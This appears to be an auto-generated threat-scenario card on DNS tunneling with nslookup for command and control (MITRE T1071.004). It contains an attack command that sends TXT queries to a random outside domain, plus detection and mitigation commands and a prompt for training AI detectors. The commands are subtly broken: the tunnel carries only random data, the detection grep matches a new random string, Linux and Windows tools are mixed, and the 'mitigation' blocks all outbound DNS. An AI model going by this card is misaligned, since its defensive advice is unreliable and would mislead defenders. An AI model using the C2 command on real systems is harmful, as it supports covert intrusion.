---
type: campaign
scenario_id: 351
tactic: Command and Control
technique: "T1071.004: Application Layer Protocol: DNS"
technique_id: T1071.004
tags: [campaign, lotl, command_and_control]
---

# Using nslookup for DNS tunneling to establish C2 channel.

## Threat Description
Using nslookup for DNS tunneling to establish C2 channel.

## Attack Command
```
nslookup -type=TXT $(echo $(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8) | base64 -w0).$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).com
```

## Detection Logic
Monitor DNS TXT queries: `tshark -Y 'dns.qry.type == 16' | grep $(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8)`; High DNS query volume: `netstat -an | findstr :53`.

## Mitigation
Restrict nslookup: `icacls %windir%\System32\nslookup.exe /deny Everyone:RX`; Deploy DNS filtering: `netsh advfirewall firewall add rule name='Block Suspicious DNS' dir=out action=block protocol=UDP remoteport=53`.

## AI Training Prompt
Train AI to detect DNS tunneling via nslookup TXT queries by analyzing query frequency, base64-encoded subdomains, and non-standard DNS traffic patterns; suggest DNS filtering rules.

## References
- MITRE ATT&CK T1071.004: https://attack.mitre.org/techniques/T1071/004/
- CWE-319: https://cwe.mitre.org/data/definitions/319.html
